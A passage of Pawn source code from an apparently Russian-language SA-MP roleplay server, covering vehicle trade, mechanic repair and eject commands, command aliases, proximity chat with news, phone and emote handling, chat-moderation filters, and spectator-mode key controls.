	SetPVarInt(playerid,"changehouse_",1);
	SetPVarInt(playerid,"changehouse_price",params[1]);
	SetPVarInt(params[0],"_changehouse",playerid+1);
	DeletePVar(params[0],"changehouse_h");
	return true;
}
CMD:changecar(playerid, params[])
{
	if(KGet(playerid) && GetVehicleModel(house_car[playerid]) == 462 || house_car[playerid] == -1) return SCM(playerid, COLOR_GREY, " Вы не владеете транспортом!");
	if(sscanf(params, "ud", params[0], params[1])) return SCM(playerid, -1, " Введите: /changecar [playerid] [цена]");
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы указали свой ID");
	if(!ProxDetectorS(8.0, playerid, params[0])) return SCM(playerid,COLOR_GREY," Необходимо находиться рядом друг с другом");
	if(!HGet(params[0]) && !KGet(params[0])) return SCM(playerid, COLOR_GREY, " У игрока нет дома / квартиры");
	if(KGet(params[0]) && GetVehicleModel(house_car[params[0]]) == 462 || house_car[params[0]] == -1) return SCM(playerid, COLOR_GREY, " Данный игрок не владеет транспортом");
	if(params[1] < 0 || params[1] > 10000000) return SCM(playerid, COLOR_GREY, " Доплата должна быть от 1 до 10000000 вирт");
	format(YCMDstr, 256, "{FFFFFF}Вы собираетесь обменяться своим личным транспортом с %s\n\n{F1E100}Вы отдаете:\n\t{FFFFFF}%s[%i]\tPercent: (%i)\n\t%i вирт\n\n{F1E100}Вы получаете:\n\t{FFFFFF}%s[%i]\tPercent: (%i)\n\t0 вирт\n\nВы согласны на сделку?",
	Name(playerid), VehicleNames[GetVehicleModel(house_car[params[0]])-400],GetVehicleModel(house_car[params[0]]),CarInfo[params[0]][carPercent][GetPVarInt(params[0], "chosencar")],params[1],VehicleNames[GetVehicleModel(house_car[playerid])-400],GetVehicleModel(house_car[playerid]),CarInfo[playerid][carPercent][GetPVarInt(playerid, "chosencar")]);
	ShowPlayerDialogEx(params[0],7205,DIALOG_STYLE_MSGBOX, "Подтверждение", YCMDstr, "Согласен", "Отмена");
	SetPVarInt(playerid,"CarOffer",params[0]);
	CarOffer[params[0]] = playerid;
	CarPrice[params[0]] = params[1];
	format(YCMDstr, sizeof(YCMDstr), " %s предложил(а) обменяться транспортом %s.",Name(playerid) ,Name(params[0]));
	ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	SCM(playerid,-1," (( Введите ''/cancel'' и выберите в меню пункт ''vehicle'' чтобы отменить обмен ))");
	return 1;
}
CMD:repair(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 2) return SCM(playerid, COLOR_GREY, " Вы не Механик!");
	if(sscanf(params, "ud", params[0],params[1])) return	SCM(playerid, COLOR_GRAD2, " Введите: /repair [playerid] [цена]");
	if(params[1] < 1 || params[1] > 10000) return SCM(playerid, COLOR_GREY, " Нельзя меньше 1, и больше 10000 вирт");
	if(!IsPlayerConnected(params[0])) return true;
	if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 525) return SCM(playerid, COLOR_GREY, " Вы не на эвакуаторе!");
	if(!ProxDetectorS(8.0, playerid, params[0])|| !IsPlayerInAnyVehicle(params[0])) return true;
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете чинить машину самому себе");
	format(YCMDstr, sizeof(YCMDstr), " Вы предложили %s отремонтировать его машину за %i вирт.",Name(params[0]),params[1]);
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Механик %s предлагает отремонтировать ваш автомобиль за %i вирт. (( /accept repair ))",Name(playerid),params[1]);
	SCM(params[0], 0x6495EDFF, YCMDstr);
	SetPVarInt(playerid,"RepairOffer",params[0]);
	RepairOffer[params[0]] = playerid;
	RepairPrice[params[0]] = params[1];
	return true;
}
CMD:eject(playerid, params[])
{
	if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GREY, " Вы не в транспортном средстве");
	new State = GetPlayerState(playerid);
	if(State!=PLAYER_STATE_DRIVER) return SCM(playerid,COLOR_GREY, " Вы должны быть водителем!");
	if(sscanf(params, "u", params[0])) return	SCM(playerid, -1, " Введите: /eject [playerid]");
	new test = GetPlayerVehicleID(playerid);
	if(!IsPlayerConnected(params[0])) return true;
	if(params[0] == playerid) return SCM(playerid, COLOR_GREY, " Вы не можете выкинуть из машины себя!");
	if(!IsPlayerInVehicle(params[0],test)) return true;
	format(YCMDstr, sizeof(YCMDstr), " Вы выкинули из машины %s",Name(params[0]));
	SCM(playerid, 0x6495EDFF, YCMDstr);
	format(YCMDstr, sizeof(YCMDstr), " Вас выкинул из машины %s",Name(playerid));
	SCM(params[0], 0x6495EDFF, YCMDstr);
	RemovePlayerFromVehicleAC(params[0]);
	return true;
}
ALTX:mafiawithdraw("/mwithdraw");
ALTX:r("/f");
ALTX:rb("/fb");
ALTX:radio("/switchwave");
ALTX:npanel("/n");
ALTX:givepayday("/gpayday");
ALTX:spawn("/sp");
ALTX:ooc("/o");
ALTX:bizlist("/бизлист");
ALTX:goverment("/gov");
ALTX:shout("/s");
ALTX:suspect("/su");
ALTX:megaphone("/m");
ALTX:sms("/t", "/txt");
//ALTX:pm("/ot");
ALTX:call("/c");
ALTX:pickup("/p");
ALTX:hangup("/h");
ALTX:recon("/re", "/ку");
ALTX:breathalyser("/bh");
ALTX:apanel("/apanel");
ALTX:delaccount("/delacc");
ALTX:admin("/a");
ALTX:geton("/online");
ALTX:teleport("/tp");
ALTX:frisk("/take");
ALTX:goto("/g");
ALTX:agivelicense("/agl");
ALTX:whisper("/w");
ALTX:addtunnequeue("/addtq");
ALTX:setplayerskin("/spskin");
ALTX:fractionid("/fid");
ALTX:directory("/dir");
ALTX:mainmenu("/mm");
ALTX:carm("/conveyingarms");
ALTX:accept("/ac");
ALTX:prodmenu("/pmenu");
ALTX:inventory("/inv");
public OnPlayerCommandText(playerid, cmdtext[])
{
	if(GetPVarInt(playerid, "USEDIALOGID") && PlayerInfo[playerid][pLogin] > 0) return true;
	return true;
}
publics: ProxDetector(Float:radi, playerid, str[],col1,col2,col3,col4,col5)
{
	if(IsPlayerConnected(playerid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		foreach(i)
		{
			if(IsPlayerConnected(i))
			{
				if(!BigEar[i])
				{
					if(GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
					{
						GetPlayerPos(i, posx, posy, posz);
						tempposx = (oldposx -posx);
						tempposy = (oldposy -posy);
						tempposz = (oldposz -posz);
						if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
						{
							SCM(i, col1, str);
						}
						else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
						{
							SCM(i, col2, str);
						}
						else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
						{
							SCM(i, col3, str);
						}
						else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
						{
							SCM(i, col4, str);
						}
						else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
						{
							SCM(i, col5, str);
						}
					}
				}
				else
				{
					SCM(i, col1, str);
				}
			}
		}
	}
	return true;
}
publics: ProxDetectorS(Float:radi, playerid, targetid)
{
	if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
	    if(Spectate[targetid] == 1) return false;
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		GetPlayerPos(targetid, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return true;
		}
	}
	return false;
}
publics: ClearMarriage(playerid)
{
	if(!IsPlayerConnected(playerid))
	{
		mysql_format(DATABASE,QUERY, 128, "UPDATE accounts SET pMarriedTo = '-' WHERE name = '%s'",PlayerInfo[playerid][pName]);
		mysql_function_query(DATABASE,QUERY,false,"","");
	}
	else strmid(PlayerInfo[playerid][pMarriedTo],"-", 0, strlen("-"), 32);
	return true;
}
public OnPlayerText(playerid, text[])
{
	new sendername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, sendername, sizeof(sendername));
	new ip[26];
	new giveplayer[MAX_PLAYER_NAME];
	GetPlayerIp(playerid,ip,sizeof(ip));
	if(IsIP(text) || CheckString(text))
	{
		if(PlayerInfo[playerid][pMuted] > 0)
		{
			format(YCMDstr, sizeof(YCMDstr), " У вас бан чата!");
			SCM(playerid, TEAM_CYAN_COLOR, YCMDstr);
			return true;
		}
		PlayerInfo[playerid][pMuted] = 10800;
		format(string, 156, "%s",text);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(string, 156, "                    Login: %s  [ID: %i]  IP: %s",sendername,playerid,ip);
		ABroadCast(COLOR_LIGHTRED,string,1);
		format(YCMDstr,sizeof(YCMDstr)," Вы получили Бан чата на 3 часа");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
		format(YCMDstr,sizeof(YCMDstr)," Используйте ''/mm'' -> ''Администрация'' -> ''Обратная связь'', если бан был выдан по ошибке");
		SCM(playerid, COLOR_LIGHTRED, YCMDstr);
	//	SetPlayerChatBubble(playerid, "Заткнут(а)",COLOR_PURPLE,30.0,10000);
		return false;
	}
	if(TalkingLive[playerid] == 1)
	{
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		format(string, 156, " < [Тел] SF News > %s: %s", sendername, text);
		OOCNews(COLOR_GREEN, string);
		Flood[playerid] = 1;
	}
	if(TalkingLivels[playerid] == 1)
	{
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		format(string, 156, " < [Тел] LS News %s: %s", sendername, text);
		LSNews(0x0073B7AA, string);
		Flood[playerid] = 1;
	}
	if(TalkingLivelv[playerid] == 1)
	{
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		format(string, 156, " < [Тел] LV News > %s: %s", sendername, text);
		LVNews(0xff9db6aa, string);
		Flood[playerid] = 1;
	}
	if(TalkingLive[playerid] == 2)
	{
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		if(PlayerInfo[playerid][pMember] == 9)
		{
			format(string, 156, " < SF News > %s: %s", sendername, text);
			OOCNews(COLOR_GREEN, string);
			Flood[playerid] = 1;
			return false;
		}
		else
		{
			format(string, 156, " < SF News > %s: %s", sendername, text);
			OOCNews(COLOR_GREEN, string);
			Flood[playerid] = 1;
			return false;
		}
	}
	if(TalkingLivels[playerid] == 2)
	{
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		if(PlayerInfo[playerid][pMember] == 16)
		{
			format(string, 156, " < LS News > %s: %s", sendername, text);
			LSNews(0x0073B7AA, string);
			Flood[playerid] = 1;
			return false;
		}
		else
		{
			format(string, 156, " < LS News > %s: %s", sendername, text);
			LSNews(0x0073B7AA, string);
			Flood[playerid] = 1;
			return false;
		}
	}
	if(TalkingLivelv[playerid] == 2)
	{
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		if(PlayerInfo[playerid][pMember] == 20)
		{
			format(string, 156, " < LV News > %s: %s", sendername, text);
			LVNews(0xff9db6aa, string);
			return false;
		}
		else
		{
			format(string, 156, " < LV News > %s: %s", sendername, text);
			LVNews(0xff9db6aa, string);
			return false;
		}
	}
	if(Tel[playerid] == 1)
	{
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		format(string, 156, " [Телефон] %s: %s", sendername, text);
		ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		return false;
	}
	if(Mobile[playerid] != 999)
	{
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		format(string, 156, " [Телефон] %s: %s", sendername, text);
		ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		if(IsPlayerConnected(Mobile[playerid]) && Mobile[Mobile[playerid]] == playerid) SCM(Mobile[playerid], COLOR_YELLOW,string);
		return false;
	}
	if(PEfir[playerid] != 255)
	{
		if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
		{
			if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");return false; }
			format(string, 156, " < SF News > %s: %s", sendername, text);
			OOCNews(COLOR_GREEN, string);
			Flood[playerid] = 1;
		}
		if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
		{
			if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
			format(string, 156, " < LV News > %s: %s", sendername, text);
			LVNews(0xff9db6aa, string);
			Flood[playerid] = 1;
		}
		if(PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pLeader] == 16)
		{
			if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
			format(string, 156, " < LS News > %s: %s", sendername, text);
			LSNews(0x0073B7AA, string);
			Flood[playerid] = 1;
		}
		if(Pefir[playerid] == 1)
		{
			if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
			format(string, 156, " < SF News > %s: %s", sendername, text);
			OOCNews(COLOR_GREEN, string);
			Flood[playerid] = 1;
		}
		if(Pefir[playerid] == 2)
		{
			if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
			format(string, 156, " < LS News > %s: %s", sendername, text);
			LSNews(0x0073B7AA, string);
			Flood[playerid] = 1;
		}
		if(Pefir[playerid] == 3)
		{
			if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
			format(string, 156, " < LV News > %s: %s", sendername, text);
			LSNews(0xff9db6aa, string);
			Flood[playerid] = 1;
		}
		return false;
	}
	if(strcmp(text, "ку", true) == 0|| strcmp(text, "й", true) == 0 || strcmp(text, "q", true) == 0)
	{
		new suspect = GetClosestforeach(playerid);
		GetPlayerName(suspect, giveplayer, sizeof(giveplayer));
		GetPlayerName(playerid, sendername, sizeof(sendername));
		if(GetDistanceBetweenPlayers(playerid,suspect) < 2 && !IsPlayerInAnyVehicle(suspect) && !IsPlayerInAnyVehicle(playerid) && suspect != -1)
		{
			if(PlayerInfo[playerid][pMember] == PlayerInfo[suspect][pMember] && IsAGang(playerid))
			{
				//CallLocalFunction("OnPlayerCommandText", "isi", playerid, "/en", suspect);
			}
		}
		switch(PlayerInfo[playerid][pMember])
		{
		case 13:
			{
				format(string,156, "Показал(a) распальцовку Los Santos Vagos Gang");
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				format(string, 156, " %s показал(a) распальцовку Los Santos Vagos Gang", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				ApplyAnimation(playerid, "GHANDS", "gsign1LH",4.1, 0, 1, 1, 1, 1);
				SetTimerEx("ClearAnim", 2000, false, "d", playerid);
				return false;
			}
		case 15:
			{
				format(string,156, "Показал(a) распальцовку Grove Street Gang");
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				format(string, 156, " %s показал(a) распальцовку Grove Street Gang", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				ApplyAnimation(playerid, "GHANDS", "gsign1LH",4.1, 0, 1, 1, 1, 1);
				SetTimerEx("ClearAnim", 2000, false, "d", playerid);
				return false;
			}
		case 17:
			{
				format(string,156, "Показал(a) распальцовку Varios Los Aztecas Gang");
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				format(string, 156, " %s показал(a) распальцовку Varios Los Aztecas Gang", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				ApplyAnimation(playerid, "GHANDS", "gsign1LH",4.1, 0, 1, 1, 1, 1);
				SetTimerEx("ClearAnim", 2000, false, "d", playerid);
				return false;
			}
		case 12:
			{
				format(string,156, "Показал(a) распальцовку The Ballas Gang");
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				format(string,156, " %s показал(a) распальцовку The Ballas Gang", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				ApplyAnimation(playerid, "GHANDS", "gsign1LH",4.1, 0, 1, 1, 1, 1);
				SetTimerEx("ClearAnim", 2000, false, "d", playerid);
				return false;
			}
		case 18:
			{
				format(string,156, "Показал(a) распальцовку The Rifa Gang");
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				format(string,156, " %s показал(a) распальцовку The Rifa Gang", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				ApplyAnimation(playerid, "GHANDS", "gsign1LH",4.1, 0, 1, 1, 1, 1);
				SetTimerEx("ClearAnim", 2000, false, "d", playerid);
				return false;
			}
		case 24:
			{
				format(string,156, "Показал(a) распальцовку Hell Angels MC");
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				format(string,156, " %s показал(a) распальцовку Hell's Angels MC", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				ApplyAnimation(playerid, "GHANDS", "gsign1LH",4.1, 0, 1, 1, 1, 1);
				SetTimerEx("ClearAnim", 2000, false, "d", playerid);
				return false;
			}
		case 26:
			{
				format(string,156, "Показал(a) распальцовку Warlocks MC");
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				format(string,156, " %s показал(a) распальцовку Warlocks MC", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				ApplyAnimation(playerid, "GHANDS", "gsign1LH",4.1, 0, 1, 1, 1, 1);
				SetTimerEx("ClearAnim", 2000, false, "d", playerid);
				return false;
			}
		case 29:
			{
				format(string,156, "Показал(a) распальцовку Pagans MC");
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				format(string,156, " %s показал(a) распальцовку Pagans MC", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				ApplyAnimation(playerid, "GHANDS", "gsign1LH",4.1, 0, 1, 1, 1, 1);
				SetTimerEx("ClearAnim", 2000, false, "d", playerid);
				return false;
			}
		case 3,19:
			{
				if(!GetPVarInt(playerid,"Fraction_Duty")) return false;
				format(string,156, "Выполнил воинское приветствие");
				SetPlayerChatBubble(playerid,string,COLOR_PURPLE,30.0,10000);
				format(string,156, " %s выполнил воинское приветствие", sendername);
				ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 1, 1);
				SetTimerEx("ClearAnim", 1300, false, "d", playerid);
				return false;
			}
		}
	}
	else if(strcmp(text, "xD", true) == 0 || strcmp(text, "хД", true) == 0 || strcmp(text, "хД", true) == 0 || strcmp(text, "хД", true) == 0 )
	{
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		format(string,90, " %s смеется", sendername);
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPlayerChatBubble(playerid, "Смеется", COLOR_PURPLE, 30.0, 10000);
		return false;
	}
	else if(strcmp(text, "чВ", true) == 0 || strcmp(text, "хДД", true) == 0 || strcmp(text, "хДД", true) == 0 || strcmp(text, "xDD", true) == 0)
	{
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		format(string,156, " %s валяется от смеха", sendername);
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPlayerChatBubble(playerid, "Валяется от смеха",COLOR_PURPLE,30.0,10000);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
		}
		return false;
	}
	else if(strcmp(text, ")", true) == 0 || strcmp(text, "))", true) == 0)
	{
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		format(string,90, " %s улыбается", sendername);
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPlayerChatBubble(playerid, "Улыбается",COLOR_PURPLE,30.0,10000);
		return false;
	}
	else if(strcmp(text, ":D", true) == 0)
	{
		if(PlayerInfo[playerid][pMuted] > 0) { SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!"); return false; }
		format(string,156, " %s хохочет во весь голос", sendername);
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		SetPlayerChatBubble(playerid, "Хохочет во весь голос",COLOR_PURPLE,30.0,10000);
		return false;
	}
	if(GetPVarInt(playerid,"BoneStol"))
	{
		if(PlayerInfo[playerid][pLogin] == 0) return false;
		if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6)
		{
			SCM(playerid,0xFFD5BBAA, " Не флуди!");
			SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
			if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
			return false;
		}
		if(PlayerInfo[playerid][pMuted] > 0)
		{
			format(string,156, " У вас бан чата! До снятия: %i минут",PlayerInfo[playerid][pMuted]/60);
			SCM(playerid, TEAM_CYAN_COLOR, string);
			return false;
		}
		format(string,156,"- %s: %s",PlayerInfo[playerid][pName],text);
		foreach(i)
		{
			if(GetPVarInt(i,"BoneStol") == GetPVarInt(playerid,"BoneStol")) SCM(i,0xc175ffaa,string);
		}
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
			if(PlayerCuffedTime[playerid] == 0) ApplyAnimation(playerid,"PED","IDLE_chat",4.1,0,1,1,1,1);
			if(PlayerCuffedTime[playerid] == 0) SetTimerEx("ClearAnim", 3600, 0, "d", playerid);
		}
		SetPlayerChatBubble(playerid, text, 0x6495EDFF, 20.0, 10000);
		Flood[playerid] = 1;
		SetPVarInt(playerid,"Flood",0);
		return false;
	}
	else if(realchat)
	{
		if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6)
		{
			SCM(playerid,0xFFD5BBAA, " Не флуди!");
			SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
			if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
			return false;
		}
		if(PlayerInfo[playerid][pLogin] == 0)
		{
			return false;
		}
		if(PlayerInfo[playerid][pMuted] > 0)
		{
			format(string,156, " У вас бан чата! До снятия: %i минут",PlayerInfo[playerid][pMuted]/60);
			SCM(playerid, TEAM_CYAN_COLOR, string);
			return false;
		}
		if(PlayerInfo[playerid][pLevel] <= 1)
		{
			new succ;
			for(new i; i<strlen(text); i++) if(PText[playerid][i] == text[i]) succ++;
			if(succ == strlen(text))
			{
				SCM(playerid,0xFFD5BBAA, " Не флуди!");
				return false;
			}
		}
		strmid(PText[playerid],text,0,256,256);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
			if(PlayerCuffedTime[playerid] == 0) ApplyAnimation(playerid,"PED","IDLE_chat",4.1,0,1,1,1,1);
			if(PlayerCuffedTime[playerid] == 0) SetTimerEx("ClearAnim", 3600, 0, "d", playerid);
		}
		GetPlayerName(playerid, sendername, sizeof(sendername));
		format(string,156, "- %s: %s", sendername, text);
		SetPlayerChatBubble(playerid, text, 0x6495EDFF, 20.0, 10000);
		ProxDetector(20.0, playerid, string, COLOR_FADE1, COLOR_FADE2, COLOR_FADE3, COLOR_FADE4, COLOR_FADE5);
		Flood[playerid] = 1;
		SetPVarInt(playerid,"Flood",0);
		return false;
	}
	return true;
}
/*forward ClickOff(playerid);
public ClickOff(playerid)
{
	ClickReconButton[playerid] = false;
	return 1;
}*/
publics: ClearAnim(playerid)
{
	ApplyAnimation(playerid,"CARRY","crry_prtial",2.5,0,0,0,0,0,0);
	return 1;
}
public OnPlayerUpdate(playerid)
{
    format(string, 100, "%i", PlayerInfo[playerid][pSatiety]);
    PlayerTextDrawSetString(playerid, Golod_PTD[playerid][0], string);
    
	GetPlayerHealth(playerid, PlayerInfo[playerid][pHP]);
	
    format(string, 40, "%f", PlayerInfo[playerid][pHP]);
    PlayerTextDrawSetString(playerid, HP_PTD[playerid][0], string);
	killed[playerid] = false;
	/*if(GetPlayerAnimationIndex(playerid))
	{
		new animlib[32],animname[32],string[128];
		GetAnimationName(GetPlayerAnimationIndex(playerid) ,animlib,sizeof(animlib),animname,sizeof(animname) );
		format(string,sizeof(string),"By Gameyer (C) | Библиоте: {EE5555}%s {FFFFFF}| Название Анимации: {EE5555}%s",animlib,animname);
		SCM(playerid,-1,string);
	}*/
    AnimTheLost[playerid] = GetPlayerAnimationIndex(playerid);
	SetPVarInt(playerid,"AFK_Tick", GetPVarInt(playerid,"AFK_Tick") + 1);
	new Keys,ud,lr;
	GetPlayerKeys(playerid,Keys,ud,lr);
	if(LastReconClick[playerid][0] != ud) LastReconClick[playerid][0] = 0;
	if(LastReconClick[playerid][1] != lr) LastReconClick[playerid][1] = 0;
	if(Spectate[playerid] && lr == KEY_LEFT && !LastReconClick[playerid][1])
	{
		LastReconClick[playerid][1] = lr;
		PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);
		SubTextDelete(playerid);
		DisableEnableReconButton(playerid, ReconSelect[playerid], 1);
		return 1;
	}
	if(Spectate[playerid] && lr == KEY_RIGHT && !LastReconClick[playerid][1])
	{
		LastReconClick[playerid][1] = lr;
		PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);

		if(ReconSelectSub[playerid] == INVALID_TEXT_DRAW) OnPlayerClickPlayerTextDraw(playerid, ReconPlayer[ReconSelect[playerid]]);
		else OnPlayerClickPlayerTextDraw(playerid, ReconPlayer[ReconSelectSub[playerid]]);
		return 1;
	}
	if(Spectate[playerid] && ud == KEY_UP && !LastReconClick[playerid][0])
	{
		PlayerPlaySound(playerid, 1083, 0.0, 0.0, 0.0);
		LastReconClick[playerid][0] = ud;
		if(ReconSelectSub[playerid] == INVALID_TEXT_DRAW)
		{
			DisableEnableReconButton(playerid, ReconSelect[playerid], 0);
			if(ReconSelect[playerid] <= 7)
			{
				ReconSelect[playerid] = 15;
				DisableEnableReconButton(playerid, ReconSelect[playerid], 1);
			}
			else
			{
				ReconSelect[playerid]--;
				DisableEnableReconButton(playerid, ReconSelect[playerid], 1);
			}
			return 1;
		}
		else
		{
			DisableEnableReconButton(playerid, ReconSelectSub[playerid], 0);
			if(ReconSelectSub[playerid] <= ReconBounds[playerid][0])
			{
				ReconSelectSub[playerid] = ReconBounds[playerid][1];
				DisableEnableReconButton(playerid, ReconSelectSub[playerid], 1);
			}
			else
			{
				ReconSelectSub[playerid]--;
				DisableEnableReconButton(playerid, ReconSelectSub[playerid], 1);
			}
		}
	}
	if(Spectate[playerid] && ud == KEY_DOWN && !LastReconClick[playerid][0])
	{
		PlayerPlaySound(playerid, 1083, 0.0, 0.0, 0.0);
		LastReconClick[playerid][0] = ud;
		if(ReconSelectSub[playerid] == INVALID_TEXT_DRAW)
		{
			DisableEnableReconButton(playerid, ReconSelect[playerid], 0);
			if(ReconSelect[playerid] >= 15)
			{
				ReconSelect[playerid] = 7;
